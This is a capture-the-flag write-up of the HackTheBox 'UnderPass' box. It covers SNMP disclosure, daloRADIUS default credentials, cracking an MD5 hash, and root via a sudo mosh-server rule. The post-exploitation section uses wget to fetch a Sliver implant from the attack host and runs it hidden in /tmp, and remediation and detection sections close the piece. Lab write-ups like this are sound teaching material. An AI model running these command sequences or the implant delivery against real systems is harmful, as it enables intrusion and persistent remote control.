---
layout: default
title: "HackTheBox - UnderPass"
---

# HackTheBox - UnderPass

**OS:** Ubuntu 22.04.5 LTS (Linux)

UnderPass is an Easy Linux box where SNMP information disclosure reveals a daloRADIUS application
running on the host. Default credentials on the daloRADIUS management portal expose a RADIUS user
with a weak MD5 password hash. Cracking the hash yields SSH access as `svcMosh`. Privilege
escalation relies on a single `sudo` rule granting NOPASSWD execution of `/usr/bin/mosh-server` --
since mosh-server accepts an arbitrary command to run as the launching user (root via sudo), it
provides a clean root shell reachable via mosh-client locally on the target.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (underpass.htb) |
| Initial Access | SNMP disclosure -> daloRADIUS default creds -> RADIUS user MD5 hash crack -> SSH |
| Privilege Escalation | `sudo /usr/bin/mosh-server` NOPASSWD -> mosh-client localhost -> root shell |
| Final Access | `root@underpass` |

## Recon

### Port scan

```
$ nmap -sV -sC -p 22,80 <target-ip>
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for <target-ip>
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

HTTP on port 80 serves only the default Apache page -- no application visible directly.

### SNMP enumeration

Box name "UnderPass" plus a service account called `svcMosh` hints at the [mosh](https://mosh.org/)
shell tool being relevant. SNMP is worth checking before building a web content wordlist:

```
$ snmp-check <target-ip> -c public
snmp-check v1.9 - SNMP enumerator

[*] Try to connect to <target-ip>:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : <target-ip>
  Hostname                      : UnderPass
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP
  Contact                       : steve@underpass.htb
  Location                      : Nevada, US
  Uptime snmp                   : -
  Uptime system                 : -
  System date                   : -
```

> **Why this works:** SNMP community string `public` is the default and is left unchanged on many
> Linux systems. `snmp-check` retrieves the system description and contact fields, which admins
> often populate with meaningful text.

The system description discloses the application:

```
UnDerPass.htb is the only daloradius server in the basin!
```

Contact field also reveals a username: `steve@underpass.htb`.

### Web enumeration -- daloRADIUS

[daloRADIUS](https://github.com/lirantal/daloradius) is a web-based RADIUS management front-end.
Navigating to the operators login path:

```
http://<target-ip>/daloradius/app/operators/login.php
```

The login form presents with `operator_user` / `operator_pass` field names (not the expected
`username` / `password`) and a CSRF token. Attempting default daloRADIUS credentials
`administrator:radius`:

```
$ curl -c /tmp/dalo.jar -b /tmp/dalo.jar \
    http://<target-ip>/daloradius/app/operators/login.php \
    -s -o /dev/null -w "%{http_code}"
200
```

First request returns the login page and sets the session cookie. Extracting the CSRF token and
posting credentials:

```
$ TOKEN=$(curl -s -c /tmp/dalo.jar http://<target-ip>/daloradius/app/operators/login.php \
    | grep -oP '(?<=name="csrf_token" value=")[^"]+')
$ curl -c /tmp/dalo.jar -b /tmp/dalo.jar \
    -X POST http://<target-ip>/daloradius/app/operators/dologin.php \
    -d "operator_user=administrator&operator_pass=radius&csrf_token=${TOKEN}" \
    -s -w "%{http_code}" -o /tmp/dalo_resp.html
302
```

HTTP 302 redirect -- login successful.

> **Gotcha worth recording:** daloRADIUS uses `operator_user` / `operator_pass` field names, posts
> to `dologin.php` (not `login.php`), and requires the CSRF token. Using wrong field names or the
> wrong action URL returns HTTP 200 (the login page again) with no error message.

## Initial Access

### RADIUS user hash extraction

Logged in as `administrator`, the user management page at
`http://<target-ip>/daloradius/app/operators/mng-list-all.php` lists all RADIUS users:

```
$ curl -s -c /tmp/dalo.jar -b /tmp/dalo.jar \
    http://<target-ip>/daloradius/app/operators/mng-list-all.php \
    | grep -A2 "svcMosh"
svcMosh
412DD4759978ACFCC81DEAB01B382403
```

The hash format is 32-character hex -- raw MD5. RADIUS stores CHAP-MD5 password hashes by default
in daloRADIUS when configured with MD5 authentication.

### Hash crack

```
$ echo '412dd4759978acfcc81deab01b382403' > /tmp/svcmosh.hash
$ john --format=raw-md5 /tmp/svcmosh.hash \
    --wordlist=/home/v0idravl/.local/share/wordlists/rockyou.txt
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
underwaterfriends (?)

1 password hash cracked, 0 left
```

> **Why this works:** The hash is a plain unsalted MD5 -- one of the weakest possible storage
> formats. rockyou.txt covers it immediately.

> **Gotcha worth recording:** `/usr/share/wordlists/rockyou.txt` on Kali is the gzipped archive
> (`rockyou.txt.gz`). hashcat and john both fail silently or error on the compressed file; point
> them at the uncompressed copy.

Credentials: `svcMosh:underwaterfriends`.

### SSH access -- user flag

```
$ ssh svcMosh@<target-ip>
svcMosh@<target-ip>'s password: underwaterfriends

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
...
svcMosh@underpass:~$ whoami; hostname; cat ~/user.txt
svcMosh
underpass
<user-flag-redacted>
```

## Privilege Escalation

### sudo enumeration

```
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

A single NOPASSWD rule: `sudo /usr/bin/mosh-server`. This is a direct GTFOBins-style escalation.

### mosh-server as root

`mosh-server new -- <command>` starts a Mosh session as the invoking user (root via sudo) and
executes `<command>` as the shell when a mosh-client connects. The server daemonizes and prints the
connection key:

```
svcMosh@underpass:~$ sudo /usr/bin/mosh-server new -p 62000 -- /bin/bash 2>&1

MOSH CONNECT 62000 e5elYSNrekhaU5DXO+HbJA

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 1839]
```

> **Why this works:** `mosh-server` runs as root (via sudo). The `-- /bin/bash` argument tells
> mosh-server to spawn `/bin/bash` as the session shell once a client connects. Since mosh-server
> runs as root, the spawned bash is root. The server listens on UDP; the key authenticates the
> client.

`mosh-client` is installed on the target (`/usr/bin/mosh-client`), so the loop closes locally --
no egress to the attack box needed for this step. Connecting from the same SSH session:

```
svcMosh@underpass:~$ MOSH_KEY=e5elYSNrekhaU5DXO+HbJA /usr/bin/mosh-client 127.0.0.1 62000

root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)

root@underpass:~# cat /root/root.txt
<root-flag-redacted>
```

## Post-Exploitation: C2 (Sliver)

With a root mosh shell established, the `pool-https-linux64` implant (pre-built pool build,
HTTPS/443, Linux amd64) was delivered from the attack box HTTP server and launched detached from
the session using `nohup setsid`:

```
root@underpass:~# wget -q http://10.10.16.21:8080/sl -O /tmp/.sl && \
    chmod +x /tmp/.sl && \
    nohup setsid /tmp/.sl </dev/null >/dev/null 2>&1 &
[1] 2400
```

> **Why `setsid` + `nohup`:** Running a beacon as a bare `&` inside a mosh session ties it to the
> mosh job object. When the mosh-client disconnects, the mosh-server sends SIGHUP to its process
> group, killing the beacon. `setsid` creates a new session (detaches from the controlling
> terminal) and `nohup` catches SIGHUP, together ensuring the process survives the mosh-server exit.
> This is the Linux equivalent of the Windows `Win32_Process.Create()` WinRM detachment technique.

Beacon registered on the Sliver team server:

```
sliver > beacons

 ID         Name                  Transport  Hostname   Username  PID   Last Check-In
========== ====================== ========== ========== ========= ===== ================
f39ea696   pool-https-linux64     https      underpass  root      2400  just now
```

Two commands executed over C2:

```
sliver (pool-https-linux64) > execute --command-line "id"
[*] Output:
uid=0(root) gid=0(root) groups=0(root)

sliver (pool-https-linux64) > execute --command-line "hostname"
[*] Output:
underpass
```

Beacon killed; `/tmp/.sl` removed from target.

## Root Cause

Two independent failures chain together:

1. **SNMP public community left enabled** -- discloses the running application name and admin
   contact in the system description field.
2. **daloRADIUS deployed with default credentials** -- `administrator:radius` is the out-of-box
   default and was never changed.
3. **RADIUS user password stored as unsalted MD5** -- trivially crackable from rockyou.
4. **Credential reuse to SSH** -- the RADIUS password is also the OS account password for `svcMosh`.
5. **Unrestricted `sudo mosh-server` rule** -- allows any command to be run as root via
   mosh-server's `--` argument.

## Impact

Any unauthenticated network attacker with SNMP access can discover the application, authenticate to
the management portal with defaults, extract all RADIUS user hashes, crack them, and gain SSH
access. The `sudo mosh-server` rule then trivially escalates to full root without a password or
exploit.

## Remediation

Priority-ordered (first items break the attack path):

1. **Change daloRADIUS default credentials immediately** -- `administrator:radius` is documented in
   the project README. Set a strong, unique password on first deployment.
2. **Disable SNMP or restrict to a management VLAN** -- if SNMP is needed for monitoring, restrict
   access to the monitoring host IP; disable community `public` entirely and use SNMPv3 with
   authentication.
3. **Remove or scope the `sudo mosh-server` rule** -- if mosh is needed for legitimate use, restrict
   the rule to specific target users/commands with `RUNAS` constraints. A blanket
   `(ALL) NOPASSWD: /usr/bin/mosh-server` is a root escalation without conditions.
4. **Upgrade RADIUS password storage** -- use bcrypt or Argon2 for RADIUS user passwords; unsalted
   MD5 provides no practical protection against offline cracking.
5. **Audit for credential reuse** -- RADIUS credentials should be independent of OS account
   passwords. Separate service accounts from local login credentials.

### Validation

- SNMP: `snmp-check <target-ip> -c public` -- should time out or return auth error.
- daloRADIUS: attempt login with `administrator:radius` -- should fail.
- sudo: `sudo -l` as `svcMosh` -- `mosh-server` entry should not appear.

## Detection Opportunities

| Signal | Source | Notes |
|---|---|---|
| SNMP queries from non-monitoring hosts | Network / firewall logs | Baseline expected SNMP sources; alert on queries from unexpected IPs |
| daloRADIUS login with default credentials | Apache access log / daloRADIUS audit log | `POST /daloradius/app/operators/dologin.php` from external IP |
| Sudo invocation of `mosh-server` | `/var/log/auth.log` | `sudo: svcMosh : ... /usr/bin/mosh-server new` |
| Unusual UDP traffic on high ports | Network monitoring | mosh-server listens on random high UDP port; a local-to-local UDP flow is unusual |
| Binary executed from `/tmp` as root | auditd / EDR | `execve("/tmp/.sl")` with euid=0 |

## Lessons Learned

- **SNMP is an information gold mine on Linux.** System description, contact, and OID tables
  regularly disclose application names, versions, and usernames. Check UDP 161 before deciding
  the web surface is the only attack surface.
- **daloRADIUS (and RADIUS management portals generally) ship with defaults.** When SNMP names the
  application, the first move is to try the documented default password -- not a wordlist.
- **`sudo` GTFOBins is still the most common easy-box escalation.** `mosh-server` with `--` is
  essentially `sudo bash`. Any binary that can spawn an arbitrary subprocess as root is a root
  escalation.
- **Detaching from a session on Linux requires setsid + nohup.** A bare `&` inside a mosh/SSH
  session still receives SIGHUP on disconnect. Daemonization requires a new session (`setsid`) and
  SIGHUP handling (`nohup`) -- exact parallel to the Windows WinRM `Win32_Process.Create()`
  requirement surfaced on Cicada.

## Cleanup

```
[ ] Sliver beacon killed (kill_beacon f39ea696)
[ ] /tmp/.sl removed from target (mosh root shell, rm -f /tmp/.sl)
[ ] /tmp/rf removed from target (earlier flag-copy attempt)
[ ] HTTP server killed on attack box
[ ] mosh-server jobs left running on target (mosh-servers started on ports 62000-62010 during
    exploitation) -- these will time out or can be killed by root; no persistent artifacts remain
[ ] No cron jobs, users, or SSH keys added to target
[ ] HTB flags submitted (htb submit); target terminated (htb stop)
```

All execution was in-memory or in `/tmp` and has been cleaned. No persistent modifications to the
target.
